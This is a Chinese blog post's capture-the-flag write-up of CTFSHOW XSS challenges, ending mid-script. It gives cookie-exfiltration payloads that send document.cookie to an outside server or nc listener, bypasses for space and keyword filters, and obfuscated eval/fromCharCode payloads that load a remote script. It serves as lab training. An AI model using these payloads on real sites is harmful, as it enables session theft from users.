@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>CTFSHOW-XSS - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="CTFSHOW-XSS - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://boogipop.com/2023/03/02/CTFSHOW-XSS/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-02T09:26:28.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>2,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">CTFSHOW-XSS</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h2 id="Web316"><a href="#Web316" class="headerlink" title="Web316"></a>Web316</h2><p>接下来开启XSS的时代！其实我老早就想玩XSS了，只是我觉得基础没打牢还不行</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002180134597.png" alt="image-20221002180134597"></p>
+<p>题目页面如上，意思就是点了生成链接后，这个靶场后台有个机器人，会自动点进这个链接，达到XSS的目的，第一次讲，就来讲的很全面！</p>
+<h3 id="语法基础"><a href="#语法基础" class="headerlink" title="语法基础"></a>语法基础</h3><p>我们学XSS肯定是需要一点js和DOM基础的（虽然我是零基础，但是慢慢学吧QWQ)，dom就是document，是html的语法</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zyhlwzy/article/details/7366814">https://blog.csdn.net/zyhlwzy/article/details/7366814</a></p>
+<p>​			<a target="_blank" rel="noopener" href="https://www.yisu.com/zixun/143876.html">https://www.yisu.com/zixun/143876.html</a></p>
+<ul>
+<li><p><code>document.cookie=</code>:设置或者是获取cookie，假如你&#x3D;后面赋值了那就是设置，没有那就是获取cookie的值：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002180813878.png" alt="image-20221002180813878"></p>
+</li>
+<li><p><code>document.location.href=&quot;&quot;:</code>这是转发语句，打开这个网址之后就会跳转到另一个网址</p>
+</li>
+</ul>
+<p>​	假如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://43.140.251.169/XSS.php&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们打开我们的html文件后，就自动跳转到这个页面，这叫做转发：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002181035940.png" alt="image-20221002181035940"></p>
+<ul>
+<li>linux中的nc指令：<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-nc.html">https://www.runoob.com/linux/linux-comm-nc.html</a></li>
+</ul>
+<blockquote>
+<ul>
+<li>-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</li>
+<li>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</li>
+<li>-h 在线帮助。</li>
+<li>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</li>
+<li>-l 使用监听模式，管控传入的资料。</li>
+<li>-n 直接使用IP地址，而不通过域名服务器。</li>
+<li>-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</li>
+<li>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</li>
+<li>-r 乱数指定本地与远端主机的通信端口。</li>
+<li>-s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。</li>
+<li>-u 使用UDP传输协议。</li>
+<li>-v 显示指令执行过程。</li>
+<li>-w&lt;超时秒数&gt; 设置等待连线的时间。</li>
+<li>-z 使用0输入&#x2F;输出模式，只在扫描通信端口时使用</li>
+</ul>
+</blockquote>
+<p>​	我们常用的nc指令就是<code>nc -lvnp 端口</code>，如<code>nc -lvnp 7777</code>，就是监听本地的7777端口，当外部机子对本地机子传入了什么文件，传入了什么参数都可以监听</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>知道以上基础就好说了</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002181309118.png"></p>
+<p>题目的意思是cookie是admin，所以要用靶场的cookie，而不是我们本地的cookie</p>
+<p>我们现在远程服务器写一个XSS.PHP：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no date input&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后直接payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://43.140.251.169/XSS.php?1=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>+是js里的连接符，这样就把cookie带出来了，我们在我们远程服务器目录下可以看到flag.txt:</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002181406862.png" alt="image-20221002181406862"></p>
+<p>是不是很通俗易懂呢？</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>我们可以用nc指令去监听，payload在下面选一个就好了：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://xxx:7777/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们用第一个，下面几条的语句我们接下来题目慢慢去发现，payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://43.140.251.169:7777/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>虽然每次监听只能监听一个，但是我们能nc多次：</p>
+<p>我们用的是腾讯云服务器，端口开发在这！反正我这台机子也没啥，我也不打码了QWQ，7777就是我设置的用来监听的端口</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002190835459.png" alt="image-20221002190835459"></p>
+<p>然后我们 <code>nc -lvnp 7777</code>:</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002191046673.png" alt="image-20221002191046673"></p>
+<p>flag成功被带出来拉！（这里要重复nc哦，因为我们自己本身也点了,不可以X自己）</p>
+<h2 id="Web317"><a href="#Web317" class="headerlink" title="Web317"></a>Web317</h2><p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002213031902.png" alt="image-20221002213031902"></p>
+<p>页面没改变，但是经过测试发现过滤了script</p>
+<p>换一种标签就可以了，这下面选一个即可</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>来讲一下这些标签的意思：</p>
+<p><code>&lt;iframe&gt;</code>:<a target="_blank" rel="noopener" href="https://wangdoc.com/html/iframe.html%E6%A0%87%E7%AD%BE%E7%94%A8%E4%BA%8E%E5%9C%A8%E7%BD%91%E9%A1%B5%E9%87%8C%E9%9D%A2%E5%B5%8C%E5%85%A5%E5%85%B6%E4%BB%96%E7%BD%91%E9%A1%B5">https://wangdoc.com/html/iframe.html标签用于在网页里面嵌入其他网页</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://www.example.com&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowfullscreen</span> <span class="attr">sandbox</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span>&gt;</span>点击打开嵌入页面<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面的代码在当前网页嵌入<code>https://www.example.com</code>，显示区域的宽度是<code>100%</code>，高度是<code>500</code>像素。如果当前浏览器不支持<code>&lt;iframe&gt;</code>，则会显示一个链接，让用户点击。</p>
+<p><code>Onload</code>：<a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/event-onload.html">https://www.runoob.com/jsref/event-onload.html</a></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002213207087.png" alt="image-20221002213207087"></p>
+<p><code>Window</code>：<a target="_blank" rel="noopener" href="https://www.runoob.com/js/js-window.html">https://www.runoob.com/js/js-window.html</a></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002213240163.png" alt="image-20221002213240163"></p>
+<p>这里不用window，直接把onload后面的东西改为documen.location.href也可以</p>
+<p><code>Window.open</code>:<a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-win-open.html">https://www.runoob.com/jsref/met-win-open.html</a></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002213325874.png" alt="image-20221002213325874"></p>
+<p><code>onfocus</code>,<code>autofocus</code>:<a target="_blank" rel="noopener" href="https://www.runoob.com/tags/ev-onfocus.html">https://www.runoob.com/tags/ev-onfocus.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/tags/att-input-autofocus.html">https://www.runoob.com/tags/att-input-autofocus.html</a></p>
+<p>onfocus是input标签里的一个属性，表示当获取焦点时运行JavaScript脚本</p>
+<p>autofocus也是input里的一个标签，和onfocus一般一起用，表示自动获取焦点，打个比方，假如有一个输入框，你点击后输入框就会变色，假如加了autofocus你不用点击输入框他就会自动变色</p>
+<p>接下来可以在payload跳转到我们自己的VPS，也可以让它访问7777端口再监听</p>
+<p><code>&lt;body onload=&quot;document.location.href=&#39;http://43.140.251.169/XSS.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<p>or</p>
+<p><code>&lt;body onload=&quot;window.open(&#39;http://43.140.251.169/XSS.php?1=&#39;+document.cookie)&quot;&gt;&lt;/body&gt;</code></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002214005030.png" alt="image-20221002214005030"></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002214017238.png" alt="image-20221002214017238"></p>
+<p>解决~</p>
+<h2 id="Web318"><a href="#Web318" class="headerlink" title="Web318"></a>Web318</h2><p>和上一题没啥区别，网上说ban了img，有啥问题吗,payload还是一样的</p>
+<h2 id="Web319"><a href="#Web319" class="headerlink" title="Web319"></a>Web319</h2><p>同上，不知道过滤了什么</p>
+<h2 id="Web320"><a href="#Web320" class="headerlink" title="Web320"></a>Web320</h2><p>经过测试发现ban掉了空格，可以用<code>%0c</code>,%09,<code>/**/</code>注释符或者<code>/</code>去绕过</p>
+<p><code>&lt;body/**/onload=&quot;document.location.href=&#39;http://43.140.251.169/XSS.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<p>%0c和%09不能直接在输入框打出，要在hackbar中url解码然后再复制过去</p>
+<h2 id="Web321"><a href="#Web321" class="headerlink" title="Web321"></a>Web321</h2><p>一开始没反应过来ban了什么，结果是ban了XSS这个字符串，没啥用</p>
+<p>payload同上</p>
+<p><code>&lt;body/**/onload=&quot;document.location.href=&#39;http://43.140.251.169/X.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<h2 id="Web323-Web326"><a href="#Web323-Web326" class="headerlink" title="Web323-Web326"></a>Web323-Web326</h2><p>增加了什么过滤我不知道，我只知道上一题的payload还是可以X出来</p>
+<h2 id="绕过总结"><a href="#绕过总结" class="headerlink" title="绕过总结"></a>绕过总结</h2><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><ul>
+<li>&#x2F;**&#x2F; :注释符绕过</li>
+<li>%09,%0c: tab和换页符绕过</li>
+<li>&#x2F;：直接一个斜杠绕过</li>
+</ul>
+<h4 id="过滤某些特殊字符"><a href="#过滤某些特殊字符" class="headerlink" title="过滤某些特殊字符"></a>过滤某些特殊字符</h4><ul>
+<li><code>document.write(String.fromCharCode(ascii码))</code>：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/write">https://developer.mozilla.org/zh-CN/docs/Web/API/Document/write</a></li>
+</ul>
+<p>首先document.write将一个文本字符串写入一个由 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/open"><code>document.open()</code></a> 打开的文档流（document stream）。</p>
+<p>示例：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>document.write()<span class="tag">&lt;/<span class="name">code</span>&gt;</span> example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">newContent</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">open</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;h1&gt;Out with the old - in with the new!&lt;/h1&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">close</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;newContent();&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Some original document content.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003011433495.png" alt="image-20221003011433495"></p>
+<ul>
+<li><code>String.fromCharCode():</code></li>
+</ul>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003011512840.png" alt="image-20221003011512840"></p>
+<p>用形如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/οnlοad=“document.write(String.fromCharCode(32));document.write(String.fromCharCode(60));document.write(String.fromCharCode(115));document.write(String.fromCharCode(67));document.write(String.fromCharCode(114));document.write(String.fromCharCode(73));document.write(String.fromCharCode(112));document.write(String.fromCharCode(116));document.write(String.fromCharCode(32));document.write(String.fromCharCode(115));document.write(String.fromCharCode(114));document.write(String.fromCharCode(67));document.write(String.fromCharCode(61));document.write(String.fromCharCode(47));document.write(String.fromCharCode(47));document.write(String.fromCharCode(120));document.write(String.fromCharCode(115));document.write(String.fromCharCode(46));document.write(String.fromCharCode(115));document.write(String.fromCharCode(98));document.write(String.fromCharCode(47));document.write(String.fromCharCode(89));document.write(String.fromCharCode(84));document.write(String.fromCharCode(85));document.write(String.fromCharCode(104));document.write(String.fromCharCode(62));document.write(String.fromCharCode(60));document.write(String.fromCharCode(47));document.write(String.fromCharCode(115));document.write(String.fromCharCode(67));document.write(String.fromCharCode(82));document.write(String.fromCharCode(105));document.write(String.fromCharCode(112));document.write(String.fromCharCode(84));document.write(String.fromCharCode(62));”</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这样的写法去写入即可</p>
+<h4 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了."></a>过滤了.</h4><ul>
+<li><code>eval()</code>:js中的eval函数会将传入的字符串当做 JavaScript 代码进行执行。</li>
+</ul>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003011846387.png" alt="image-20221003011846387"></p>
+<p>然后eval会识别16进制的字符串,用形如下面这样的例子去绕过：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/οnlοad=eval(&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x36\x30\x2c\x31\x31\x35\x2c\x36\x37\x2c\x31\x31\x34\x2c\x37\x33\x2c\x31\x31\x32\x2c\x31\x31\x36\x2c\x33\x32\x2c\x31\x31\x35\x2c\x31\x31\x34\x2c\x36\x37\x2c\x36\x31\x2c\x34\x37\x2c\x34\x37\x2c\x31\x32\x30\x2c\x31\x31\x35\x2c\x34\x36\x2c\x31\x31\x35\x2c\x39\x38\x2c\x34\x37\x2c\x38\x39\x2c\x38\x34\x2c\x38\x35\x2c\x31\x30\x34\x2c\x36\x32\x2c\x36\x30\x2c\x34\x37\x2c\x31\x31\x35\x2c\x36\x37\x2c\x38\x32\x2c\x31\x30\x35\x2c\x31\x31\x32\x2c\x38\x34\x2c\x36\x32\x29\x29\x3b&quot;)&gt;</span><br><span class="line"><span class="comment">&lt;!--document.write(String.fromCharCode(60,115,67,114,73,112,116,32,115,114,67,61,47,47,120,115,46,115,98,47,89,84,85,104,62,60,47,115,67,82,105,112,84,62));</span></span><br></pre></td></tr></table></figure>
+
+<p>上面的十六进制字符串可以用下列脚本来生成：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a= <span class="string">&quot;&lt;sCrIpt srC=//xs.sb/YTUh&gt;&lt;/sCRipT&gt;&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">res2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">  tmp = <span class="built_in">ord</span>(i)</span><br><span class="line">  res += <span class="built_in">str</span>(tmp)</span><br><span class="line">  res+=<span class="string">&quot;,&quot;</span></span><br><span class="line">  res2 +=<span class="string">f&quot;document.write(String.fromCharCode(<span class="subst">&#123;<span class="built_in">str</span>(tmp)&#125;</span>));&quot;</span></span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line"><span class="comment"># print(res2)</span></span><br><span class="line"><span class="comment">#-------------生成脚本分为上下2个，上面的是生成没过滤.的脚本---------------</span></span><br><span class="line">a = <span class="string">&quot;646f63756d656e742e777269746528537472696e672e66726f6d43686172436f64652836302c3131352c36372c3131342c37332c3131322c3131362c33322c3131352c3131342c36372c36312c34372c34372c3132302c3131352c34362c3131352c39382c34372c38392c38342c38352c3130342c36322c36302c34372c3131352c36372c38322c3130352c3131322c38342c363229293b&quot;</span></span><br><span class="line">z = <span class="number">0</span></span><br><span class="line">res = <span 